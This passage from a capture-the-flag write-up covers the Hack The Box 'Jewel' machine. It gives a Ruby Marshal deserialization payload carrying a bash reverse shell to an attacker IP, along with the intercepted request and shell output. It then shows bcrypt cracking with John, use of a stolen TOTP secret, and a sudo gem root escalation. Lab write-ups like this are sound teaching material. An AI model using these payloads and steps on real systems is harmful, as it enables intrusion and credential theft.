are constraints on the database not the cache), then it will update the database
but fails because there username format won&rsquo;t we respected and so it will trigger
the cache deletion. But the deletion won&rsquo;t work because as the payload will be
evaluated it will crash the app (500 error) so the cached value will stay stored
and be retrieved on a subsequent fetch request.</p><h2 id=web-exploitation>Web exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h2><p>Since it&rsquo;s an authenticated vulnerability (yes to update your username you need
an account), let&rsquo;s register one on the blog (http://10.10.10.211:8080/signup).</p><p>We can edit the username at this address http://10.10.10.211:8080/users/19/edit
but before that we&rsquo;ll need to craft a payload.</p><p>Let&rsquo;s retrieve the PoC from the H1 report and modify it a little bit to include
a reverse shell and url-encode the payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;erb&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;rails/all&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;uri&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>remote_code</span> <span class=o>=</span> <span class=s>&lt;&lt;-RUBY
</span></span></span><span class=line><span class=cl><span class=s></span><span class=sb>`/bin/bash -c &#34;bash -i &amp;&gt;/dev/tcp/10.10.14.125/9999 0&gt;&amp;1&#34;`</span>
</span></span><span class=line><span class=cl><span class=no>RUBY</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>erb</span> <span class=o>=</span> <span class=no>ERB</span><span class=o>.</span><span class=n>allocate</span>
</span></span><span class=line><span class=cl><span class=n>erb</span><span class=o>.</span><span class=n>instance_variable_set</span><span class=p>(</span><span class=ss>:@src</span><span class=p>,</span> <span class=n>remote_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>erb</span><span class=o>.</span><span class=n>instance_variable_set</span><span class=p>(</span><span class=ss>:@lineno</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>deprecation</span> <span class=o>=</span> <span class=no>ActiveSupport</span><span class=o>::</span><span class=no>Deprecation</span><span class=o>::</span><span class=no>DeprecatedInstanceVariableProxy</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>erb</span><span class=p>,</span> <span class=ss>:result</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exploit_data</span> <span class=o>=</span> <span class=no>Marshal</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=n>deprecation</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=no>URI</span><span class=o>.</span><span class=n>encode_www_form</span><span class=p>(</span><span class=ss>username</span><span class=p>:</span> <span class=n>exploit_data</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Lets&rsquo; build the payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ bundle exec ruby exploit.rb
</span></span><span class=line><span class=cl>username=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22B%25x%28%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.125%2F9999+0%3E%261%22%29%0A%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
</span></span></code></pre></td></tr></table></div></div><p>Intercept traffic with Burp and replace the username with the payload.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/users/19</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.10.211:8080</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.10.211:8080/users/19/edit</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>584</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.10.211:8080</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>_session_id=39429a031ee66edae6af06579185eb80</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>utf8=%E2%9C%93&amp;_method=patch&amp;authenticity_token=tlufjzm%2FbY9fBxS%2Bu1QqkY%2BoaSXn3cEL40I1tGF6g4lYvmhcsv8i5NKjpDuOnn6vOABZIzmfLrWS%2Fy7vjgEAsQ%3D%3D&amp;user%5Busername%5D=username=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22B%25x%28%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.125%2F9999+0%3E%261%22%29%0A%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&amp;commit=Update+User
</span></span></code></pre></td></tr></table></div></div><p>We retrieve the shell on our listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ rlwrap pwncat -l 9999 -vv
</span></span><span class=line><span class=cl>INFO: Listening on :::9999 (family 10/IPv6, TCP)
</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>INFO: Client connected from 10.10.10.211:51176 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>bash: cannot set terminal process group (811): Inappropriate ioctl for device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>bill@jewel:~/blog$ id
</span></span><span class=line><span class=cl>uid=1000(bill) gid=1000(bill) groups=1000(bill)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bill@jewel:~$ cat user.txt
</span></span><span class=line><span class=cl>02d71a6b8858cc2812ee368bc1ab355b
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-bill-to-root>Privilege Escalation of Machine : from bill to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-bill-to-root>#</a></h2><p>Let&rsquo;s get an interactive shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>bill@jewel:~$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span></code></pre></td></tr></table></div></div><p>We can&rsquo;t use <code>sudo -l</code> because we don&rsquo;t know bill&rsquo;s password.</p><p>Let&rsquo;s find backup or config files in hope to discover passwords:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>bill@jewel:~$ find / -name *.sql -type f 2&gt;/dev/null
</span></span><span class=line><span class=cl>/var/backups/dump_2020-08-27.sql
</span></span><span class=line><span class=cl>/usr/share/postgresql/11/extension/citext--1.4--1.5.sql
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bill@jewel:~$ grep -n password /var/backups/dump_2020-08-27.sql
</span></span><span class=line><span class=cl>132:    password_digest character varying
</span></span><span class=line><span class=cl>229:COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s dig around line 229:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--
</span></span></span><span class=line><span class=cl><span class=c1>-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: rails_dev
</span></span></span><span class=line><span class=cl><span class=c1>--
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>COPY</span><span class=w> </span><span class=k>public</span><span class=p>.</span><span class=n>users</span><span class=w> </span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>email</span><span class=p>,</span><span class=w> </span><span class=n>created_at</span><span class=p>,</span><span class=w> </span><span class=n>updated_at</span><span class=p>,</span><span class=w> </span><span class=n>password_digest</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=k>stdin</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>2</span><span class=w>       </span><span class=n>jennifer</span><span class=w>        </span><span class=n>jennifer</span><span class=o>@</span><span class=n>mail</span><span class=p>.</span><span class=n>htb</span><span class=w>       </span><span class=mi>2020</span><span class=o>-</span><span class=mi>08</span><span class=o>-</span><span class=mi>27</span><span class=w> </span><span class=mi>05</span><span class=p>:</span><span class=mi>44</span><span class=p>:</span><span class=mi>28</span><span class=p>.</span><span class=mi>551735</span><span class=w>      </span><span class=mi>2020</span><span class=o>-</span><span class=mi>08</span><span class=o>-</span><span class=mi>27</span><span class=w> </span><span class=mi>05</span><span class=p>:</span><span class=mi>44</span><span class=p>:</span><span class=mi>28</span><span class=p>.</span><span class=mi>551735</span><span class=w>      </span><span class=err>$</span><span class=mi>2</span><span class=n>a$12$sZac9R2VSQYjOcBTTUYy6</span><span class=p>.</span><span class=n>Zd</span><span class=p>.</span><span class=mi>5</span><span class=n>I02OnmkKnD3zA6MqMrzLKz0jeDO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=w>       </span><span class=n>bill</span><span class=w>    </span><span class=n>bill</span><span class=o>@</span><span class=n>mail</span><span class=p>.</span><span class=n>htb</span><span class=w>   </span><span class=mi>2020</span><span class=o>-</span><span class=mi>08</span><span class=o>-</span><span class=mi>26</span><span class=w> </span><span class=mi>10</span><span class=p>:</span><span class=mi>24</span><span class=p>:</span><span class=mi>03</span><span class=p>.</span><span class=mi>878232</span><span class=w>      </span><span class=mi>2020</span><span class=o>-</span><span class=mi>08</span><span class=o>-</span><span class=mi>27</span><span class=w> </span><span class=mi>09</span><span class=p>:</span><span class=mi>18</span><span class=p>:</span><span class=mi>11</span><span class=p>.</span><span class=mi>636483</span><span class=w>      </span><span class=err>$</span><span class=mi>2</span><span class=n>a$12$QqfetsTSBVxMXpnTR</span><span class=p>.</span><span class=n>JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=p>.</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s ask my old pall John if he knows them:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>jennifer:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
</span></span><span class=line><span class=cl>bill:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ john hashes.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=bcrypt
</span></span></code></pre></td></tr></table></div></div><p>I found bill&rsquo;s password but not jennifer one.</p><p><code>bill</code> / <code>spongebob</code></p><p>Trying sudo again we are asked for a verification code, it reminds me when
I set up OTP with <a href=https://wiki.archlinux.org/index.php/Google_Authenticator><code>libpam-google-authenticator</code></a> for a SSH server.</p><p>We can find bill&rsquo;s OTP private key in his home directory:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>bill@jewel:~$ cat .google_authenticator
</span></span><span class=line><span class=cl>2UQI3R52WFCLE6JTLDCSJYMJH4
</span></span><span class=line><span class=cl>&#34; WINDOW_SIZE 17
</span></span><span class=line><span class=cl>&#34; TOTP_AUTH
</span></span></code></pre></td></tr></table></div></div><p>I was able to generate a one time password with oath-toolkit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ oathtool -b --totp 2UQI3R52WFCLE6JTLDCSJYMJH4
</span></span><span class=line><span class=cl>297774
</span></span></code></pre></td></tr></table></div></div><p>But I kept having this error while trying to auth:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>Error &#34;Operation not permitted&#34; while writing config
</span></span></code></pre></td></tr></table></div></div><p>TOTP is time based and I&rsquo;m not in the same timezone than the box:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl># box
</span></span><span class=line><span class=cl>Sun 21 Feb 20:45:21 GMT 2021
</span></span><span class=line><span class=cl># my machine
</span></span><span class=line><span class=cl>Sun Feb 21 09:35:41 PM CET 2021
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s print the box time in RFC format:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ date --rfc-3339=seconds
</span></span><span class=line><span class=cl>2021-02-21 20:50:55+00:00
</span></span></code></pre></td></tr></table></div></div><p>So I tried to create the OTP code like that but it kept failing:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ oathtool -b --totp 2UQI3R52WFCLE6JTLDCSJYMJH4 -S &#39;2021-02-21 20:54:31+00:00&#39;
</span></span><span class=line><span class=cl>626503
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try another method: setting teh same time on our machine. The box timezone:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ timedatectl
</span></span><span class=line><span class=cl>               Local time: Sun 2021-02-21 21:08:22 GMT
</span></span><span class=line><span class=cl>           Universal time: Sun 2021-02-21 21:08:22 UTC
</span></span><span class=line><span class=cl>                 RTC time: Sun 2021-02-21 21:08:21
</span></span><span class=line><span class=cl>                Time zone: Europe/London (GMT, +0000)
</span></span><span class=line><span class=cl>System clock synchronized: no
</span></span><span class=line><span class=cl>              NTP service: active
</span></span><span class=line><span class=cl>          RTC in local TZ: no
</span></span></code></pre></td></tr></table></div></div><p>Set up the time on my machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ sudo timedatectl set-timezone Europe/London
</span></span><span class=line><span class=cl>$ sudo timedatectl set-ntp false
</span></span><span class=line><span class=cl>$ sudo timedatectl set-time 21:15:07
</span></span></code></pre></td></tr></table></div></div><p>Finaly I can run it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ sudo -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching Defaults entries for bill on jewel:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
</span></span><span class=line><span class=cl>    insults
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User bill may run the following commands on jewel:
</span></span><span class=line><span class=cl>    (ALL : ALL) /usr/bin/gem
</span></span></code></pre></td></tr></table></div></div><p>PS: it&rsquo;s not an issue if there is a desync of a few seconds because the OTP
window is 17 codes so we can have a max desync of 17 x 30 sec.</p><p>Let&rsquo;s see the pe for <code>gem</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ gtfoblookup linux sudo gem
</span></span><span class=line><span class=cl>gem:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    sudo:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Description: This requires the name of an installed gem to be
</span></span><span class=line><span class=cl>                     provided (`rdoc` is usually installed).
</span></span><span class=line><span class=cl>        Code: sudo gem open -e &#34;/bin/sh -c /bin/sh&#34; rdoc
</span></span></code></pre></td></tr></table></div></div><p>My paylmaod will be</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo /usr/bin/gem open -e &#34;/bin/sh -c /bin/bash&#34; bundler
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s get root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl># id
</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># cat /root/root.txt
</span></span><span class=line><span class=cl>96a8f2a385ce2c384353e6998dc3fdac
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>